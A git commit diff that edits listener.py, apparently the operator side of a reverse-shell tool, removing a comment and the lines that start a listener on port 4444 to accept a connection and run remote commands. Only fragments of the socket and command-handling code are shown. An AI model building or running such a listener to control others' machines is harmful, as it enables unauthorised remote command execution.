426e3cbcaf4e66d864feefb31df7e327a1a18e3c
Berk Ali Çakır <63811690+HellReys@users.noreply.github.com>
2024-07-30 16:36:52 +0300

    Update listener.py

--- listener.py
+++ listener.py
@@ -8,7 +8,7 @@ class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))  # Your ıp address and port which is you want to use
+        listener.bind((ip, port))
         listener.listen(0)
         print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
@@ -58,6 +58,3 @@ class Listener:
                 result = "[-] Error during command execution"
 
             print(result)
-
-my_listener = Listener("YOUR IP ADDRESS", 4444)
-my_listener.run()
